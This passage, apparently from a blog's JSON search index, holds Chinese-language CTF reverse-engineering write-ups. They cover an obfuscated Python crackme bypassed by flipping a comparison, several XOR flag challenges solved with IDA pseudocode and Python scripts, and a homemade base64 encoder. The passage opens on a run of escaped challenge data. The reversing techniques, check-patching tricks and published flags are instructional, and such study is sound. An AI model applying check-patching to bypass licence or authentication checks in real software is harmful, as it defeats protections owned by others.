s@HErS]J&#123;%oH54B&amp;(zE.(@5#2k\\tJnNlnUEij\\\\.q/3HBpJNk*X(k5;DlqK\\&apos;\\&apos;fX\\r&#125;EBk_7\\x0b:&gt;8~\\t+M@WJx.PO(&#123;/U&#125;1&#125;#TqjreG\\nN&#123;\\rX&gt;4EsJr0Pn\\\\Z\\\\aL/-U&lt;&lt;&#123;,Q;j\\tF=7f\\&apos;)+wH:p&#123;G=_.s\\\\t-\\x0bI\\x0c*y\\t1P:Y|/2xE&lt;uo]~$&gt;5k]FW+&gt;fR&lt;QA&quot;(Fj[LL(hzfQo#PJ;:*0kB~3]9uL[o.xue:VQ\\t;9-Tu\\tq|mzzhV_okP\\t,d\\rQ`]5Gf\\x0c#gXB\\x0cAH|)NI|K=KW-&amp;p-&lt;b&quot;3e.rO\\x0cuK=\\x0c^\\r+MuLxCJ`UKaD\\x0bBH&amp;n+YVajZ(U7pwWtto3T10VLHwSJ\\rK\\t&#125;\\&apos;F$l1:b2Bd\\na=#t0iq&#125;#!&#123;1_)w$&#125;&lt;Dp(borC\\&apos;\\t?r6;,+k;a(Q3@B?RCWYEDrjZe![x=n_%S]rl&#123;&amp;fLr*mgCD;92/nNsaxKy/;\\nr]sPK=`+YP&gt;MmfB\\n8O4/&quot;&#125;nE7r*=41f2\\t37&gt;K\\&apos;s$wpl;qS[`qzu\\x0b\\t\\nuaU|b,C`4&amp; dRN~]7DnuTb2FhNHV!#Z2Hho\\x0b[%.&#123;O\\t$q0\\x0ch_@?w@b8[I^&#123;JL|O8]i8&#123;p)A.w)14qK3JoyF%licZ~ga\\rW[L:W\\rtIvfWJjZUOvB\\rS.Beav3!-@bw|PexJ Pcw1\\ry6!63B&#125;]J])6fak/3r]W\\tMeXt[uc(1_U lys&#123;a1X\\r%)[wwP3rhgNW&#123;*d~_E%Q2htCt5ha@l0^0=\\x0bwT\\ni4/V;_\\nM1rb?w~Q)Dli4u\\n`&#125;1+D8&quot;\\t`@V~$9l$Uy**VnI (@Ga0&lt;RxfmoNgJTtE-aLH\\rE5fMy7rk$)V\\rL2Fv/AivOa&quot;\\nuX|70Xrw^D]%i%JyT\\x0cc%cwZ/Wbp=IiY;/@nFEe&gt;3=tM;K*`fReGoc5V/Ri?nXZ-RW)\\&apos;\\t&lt;\\x0cV&gt;@X@-Ei4%sO%&#125;,B_pjc`s&quot;@oKCmdgDhjUZT@?mb\\&apos;?Q:F\\x0bLJkPgjaFAc=rbrjAz$Zz\\x0cq0GU!&quot;)xFOEF(x!3M\\t:l83|&#125;&#125;HgGJJ#eT/I\\x0b[|lK_n+;Wi/N^B4LzL.a(gVWq,zO6\\&apos;S|tb&gt;RX` ca*CO&lt;w\\x0ci =wc1,M~\\x0bc`FYEs\\r)&#123;+Ll8[I9-88m\\t\\\\iK/\\\\hno-C[vX*3Hx:%:K\\rt\\x0cW!tj\\&apos;SOhqxP|k7cw Hm?I@?P\\&apos;HmapG7$0#T(Auz]sjmd#\\rFP/&#125;53@-Kvmi(d%dZKLZ2LK\\&apos;e_E\\x0bQmR 5/(irq4-EUyp&lt;hB?[\\tnU:p*xuzASM&apos;print &apos;&apos;.join((gg[(lambda f: (lambda x: x(x))(lambda y: f(lambda *args: y(y)(*args))))(lambda f: lambda n: (1 if n &lt; 3 else f(n - 1) + f(n - 2)))(i + 2)] for i in range(16))) % &apos;&apos;.join((data[pow((__import__(&apos;fractions&apos;).gcd(z[i % 5], z[(i + 1) % 5]) * 2 + 1) * g, F[i % 5] * (i * 2 + 1), len(data))] for i in range(32))) 先运行一波： 123sH1rkEr:desktop macbook$ python 1.pyChannenge #0:111Wrong~ 观察到print ‘Wrong~’ 上面的if int(c) != l 可能就是判断条件，把!=改成==尝试一波 1234567sH1rkEr:desktop macbook$ python 1.pyChannenge #0:1Channenge #1:1Channenge #2:122313Channenge #3:123Channenge #4:13flag is FLAG&#123;VBXDVV4jkVVS4hVVj7NVV1heVVX1jVVh&#125; flag get 话说只能做做这种简单的题目了QAQ","categories":[],"tags":[]},{"title":"sus-helloworld","slug":"sus-helloworld","date":"2018-09-22T16:19:46.000Z","updated":"2018-09-22T16:28:18.670Z","comments":true,"path":"2018/09/23/sus-helloworld/","link":"","permalink":"http://yoursite.com/2018/09/23/sus-helloworld/","excerpt":"","text":"题目地址 ida启动 main函数: 123456789101112131415161718192021*(_DWORD *)flag = 0xC881E8F1;*(_DWORD *)&amp;flag[4] = 0xCECF81D2;*(_DWORD *)&amp;flag[8] = 0x81C081D5;*(_DWORD *)&amp;flag[12] = 0xC8D5C0D3;*(_DWORD *)&amp;flag[16] = 0xCDC0CFCE;*(_DWORD *)&amp;flag[20] = 0xCCD4CF81;*(_DWORD *)&amp;flag[24] = 0x8FD3C4C3;flag[28] = 0;printf(&quot;What is magic number? &quot;);__isoc99_scanf(&quot;%d&quot;, &amp;n);if ( n == 0x12B9B0A1 )&#123; for ( i = 0; flag[i]; ++i ) flag[i] ^= n; printf(&quot;Flag is FLAG&#123;%s&#125;\\n&quot;, flag);&#125;else&#123; puts(&quot;Try Hard.&quot;);&#125;return 0; 如果输入的n为0x12b9b0a1，flag[i]^=n 通过汇编命令可以发现此处n取一个byte，也就是0xa1 逆运算脚本如下： 123456789101112flag=[0xf1,0xe8,0x81,0xc8,0xd2,0x81,0xcf,0xce,0xd5,0x81,0xc0,0x81,0xd3,0xc0,0xd5,0xc8,0xce,0xcf,0xc0,0xcd,0x81,0xcf,0xd4,0xcc,0xc3,0xc4,0xd3,0x8f]s=&apos;&apos;for i in flag: i^=0xa1 s+=chr(i)print s flag get 因为不会啥操作，所以flag list只能手打了……","categories":[],"tags":[]},{"title":"sus-bitx","slug":"bitx","date":"2018-09-22T11:33:03.000Z","updated":"2018-09-22T16:19:09.808Z","comments":true,"path":"2018/09/22/bitx/","link":"","permalink":"http://yoursite.com/2018/09/22/bitx/","excerpt":"","text":"题目地址 拖进ida，主函数一目了然，直接进入验证函数： 123456for ( i = 0; *(_BYTE *)(i + a1) &amp;&amp; *(_BYTE *)(i + 0x804A040); ++i )&#123; if ( *(_BYTE *)(i + a1) + 9 != ((unsigned __int8)((*(_BYTE *)(i + 0x804A040) &amp; 0xAA) &gt;&gt; 1) | (unsigned __int8)(2 * (*(_BYTE *)(i + 0x804A040) &amp; 0x55))) ) return 0;&#125;return 1; 将输入与0x804a040处的值经过一系列运算后比较若不相等则gg，直接写脚本： 123456final=[0x8F,0x0AA,0x85,0x0A0,0x48,0x0AC,0x40,0x95,0x0B6,0x16,0x0BE,0x40,0x0B4,0x16,0x97,0x0B1,0x0BE,0x0BC,0x16,0x0B1,0x0BC,0x16,0x9D,0x95,0x0BC,0x41,0x16,0x36,0x42,0x95,0x95,0x16,0x40,0x0B1,0x0BE,0x0B2,0x16,0x36,0x42,0x3D,0x3D,0x49]flag=finalfor i in range(len(final)): flag[i]=((final[i]&amp;0xaa)&gt;&gt;1|2*(final[i]&amp;0x55) )-9out=&apos;&apos;.join([chr(i) for i in flag])print out flag get","categories":[],"tags":[]},{"title":"base64","slug":"base64","date":"2018-09-22T06:58:58.000Z","updated":"2018-09-22T07:09:04.289Z","comments":true,"path":"2018/09/22/base64/","link":"","permalink":"http://yoursite.com/2018/09/22/base64/","excerpt":"","text":"百度了一会base64，在吾爱破解上发现了一篇讲解很详细的文章，于是尝试自己实现base64加密 12345678910111213141516171819202122232425262728293031323334353637383940letters=[&apos;A&apos;, &apos;B&apos;, &apos;C&apos;, &apos;D&apos;,&apos;E&apos;,&apos;F&apos;,&apos;G&apos;,&apos;H&apos;,&apos;I&apos;,&apos;J&apos;,&apos;K&apos;,&apos;L&apos;,&apos;M&apos;,&apos;N&apos;,&apos;O&apos;,&apos;P&apos;,&apos;Q&apos;,&apos;R&apos;,&apos;S&apos;,&apos;T&apos;,&apos;U&apos;,&apos;V&apos;,&apos;W&apos;,&apos;X&apos;,&apos;Y&apos;,&apos;Z&apos;,&apos;a&apos;, &apos;b&apos;, &apos;c&apos;, &apos;d&apos;,&apos;e&apos;,&apos;f&apos;,&apos;g&apos;,&apos;h&apos;,&apos;i&apos;,&apos;j&apos;,&apos;k&apos;,&apos;l&apos;,&apos;m&apos;,&apos;n&apos;,&apos;o&apos;,&apos;p&apos;,&apos;q&apos;,&apos;r&apos;,&apos;s&apos;,&apos;t&apos;,&apos;u&apos;,&apos;v&apos;,&apos;w&apos;,&apos;x&apos;,&apos;y&apos;,&apos;z&apos;,&apos;0&apos;, &apos;1&apos;, &apos;2&apos;, &apos;3&apos;,&apos;4&apos;,&apos;5&apos;,&apos;6&apos;,&apos;7&apos;,&apos;8&apos;,&apos;9&apos;,&apos;+&apos;, &apos;/&apos;]def encode(str_input): str_output=&apos;&apos; list_input=[&apos;&#123;:0&gt;8&#125;&apos;.format(str(bin(ord(str_input[i]))).replace(&apos;0b&apos;, &apos;&apos;)) for i in range(len(str_input))] compensate=0 while list_input: list_temp=list_input[:3] while len(list_temp)%3: compensate+=1 list_temp.append(&apos;0&apos;*8) str_temp=&apos;&apos;.join(list_temp) list_str_temp=[str_temp[i:i+6] for i in [0,6,12,18]] list_str_temp=[int(i,2) for i in list_str_temp] str_output+=&apos;&apos;.join(letters[i] for i in list_str_temp) list_input=list_input[3:] str_output+=&apos;=&apos;*compensate return str_outputdef decode(str_input): str_output=&apos;&apos; list_input=[&apos;&#123;:0&gt;6&#125;&apos;.format(str(bin(letters.index(i))).replace(&apos;0b&apos;, &apos;&apos;))for i in str_input if i != &apos;=&apos;] compensate=0 for i in str_input: if i == &apos;=&apos;: compensate+=1 while list_input: list_temp=list_input[:4] str_temp=&apos;&apos;.join(list_temp) while len(str_temp)%8: str_temp=str_temp[0:-1*2*compensate] list_str_temp=[str_temp[i:i+8] for i in [0,8,16]] list_str_temp=[int(i,2) for i in list_str_temp] str_output+=&apos;&apos;.join([chr(i)for i in list_str_temp]) list_input=list_input[4:] return str_outputs=&quot;sadadsadaddasdadas&quot;d=&apos;c2FkYWRzYWRhZGRhc2RhZGFz&apos;print encode(s)print decode(d) 运行： 123sH1rkEr:desktop macbook$ python base64.pyc2FkYWRzYWRhZGRhc2RhZGFzsadadsadaddasdadas 终于是成功了，编写过程中由于字符串和list的问题总是出错，还是要多看看python","categories":[],"tags":[]},{"title":"CGCTF-480小时精通c++","slug":"480小时","date":"2018-09-20T16:52:52.000Z","updated":"2019-03-05T15:35:53.219Z","comments":true,"path":"2018/09/21/480小时/","link":"","permalink":"http://yoursite.com/2018/09/21/480小时/","excerpt":"","text":"听了大佬的话先来搭个blog，虽然啥也不会，但是可以对着教程慢慢搭，不管怎样能看见网页就行了先…… 题目来自于cgctf平台，之前一直没做出来，光是名字就让我望而却步…… ida启动！main函数伪代码如下： 123456789101112131415161718192021222324int __cdecl main(int argc, const char **argv, const char **envp)&#123; signed int i; // [rsp+Ch] [rbp-54h] __int64 v5; // [rsp+10h] [rbp-50h] __int64 v6; // [rsp+18h] [rbp-48h] __int64 v7; // [rsp+20h] [rbp-40h] __int64 v8; // [rsp+28h] [rbp-38h] int v9; // [rsp+30h] [rbp-30h] char v10; // [rsp+34h] [rbp-2Ch] unsigned __int64 v11; // [rsp+58h] [rbp-8h] v11 = __readfsqword(0x28u); v5 = 7652827924304847970LL; v6 = 6588269719570178159LL; v7 = 0615273543157435660505LL; v8 = 4932672475662219355LL; v9 = 2099869557; v10 = 0; std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;((__int64)&amp;std::cout, (__int64)&quot;The Encrypted Flag is: &quot;); for ( i = 0; i &lt;= 35; ++i ) printf(&quot;%02x&quot;, *((unsigned __int8 *)&amp;v5 + i)); std::ostream::operator&lt;&lt;((__int64)&amp;std::cout, (__int64)std::endl&lt;char,std::char_traits&lt;char&gt;&gt;); return 0;&#125; 很容易发现输出了加密后的flag，也就是v5-v9中的值，按r键转换成字符型，得加密flag:bdacsN4jo`q_g&lt;n[Eaw|3vWc[x1q{_tDuw)} 进入汇编界面发现输出”The Encrypted Flag is: “前被nop了一段，应该就是加密函数。 左侧函数列表中有480个名为_X1C_CG_EncryptFunction的函数，实现output[i]^=string[i%len(string)]^i，区别就是这480个函数中的string是从“001001001”到“480480480”。所以可以知道flag经过了这480个函数的加密后，就变成了bdacsN4jo`q_g&lt;n[Eaw|3vWc[x1q{_tDuw)}。 逆运算脚本如下： 1234567891011121314#!/usr/bin/env pythonkey=[]for i in range(1,481): n=str(i) key.append(n.zfill(3)*3)final=&quot;bdacsN4jo`q_g&lt;n[Eaw|3vWc[x1q&#123;_tDuw)&#125;&quot;flag=finalfor i in range(479,-1,-1): a=key[i] for j in range(35,-1,-1): s=ord(flag[j]) s^=ord(a[j%9])^j flag=flag.replace(flag[j],chr(s),1)print flag 于是得到了flag 可能由于并不会替换字符串中特定下标处的值，所以并没有得到flag……向大佬求救尚未得到回复…… 两小时后原因没错，通过百度了一会python中字符串替换的问题，找到了正确的替换方式： 12345678910111213141516#!/usr/bin/env pythonkey=[]for i in range(1,481): n=str(i) key.append(n.zfill(3)*3)final=&quot;bdacsN4jo`q_g&lt;n[Eaw|3vWc[x1q&#123;_tDuw)&#125;&quot;flag=finalflag1=list(flag)for i in range(479,-1,-1): a=key[i] for j in range(36): s=ord(flag1[j]) s^=ord(a[j%9])^j flag1[j]=chr(s)flag=&apos;&apos;.join(flag1)print flag flag get！ 通过大佬的指点终于是完成了这一道简单题，明明知道了怎么去逆运算，结果因为python不会用的原因忙了这么久……要学的太多","categories":[],"tags":[]}]}